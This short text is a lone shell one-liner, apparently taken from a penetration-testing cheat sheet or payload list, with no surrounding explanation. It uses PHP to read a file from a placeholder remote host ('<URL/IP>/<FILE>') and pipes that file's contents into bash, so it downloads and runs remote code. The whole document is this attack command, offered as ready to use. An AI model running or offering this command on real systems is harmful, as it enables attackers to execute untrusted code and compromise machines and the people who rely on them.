php -r '$lines = @file("https://<URL/IP>/<FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
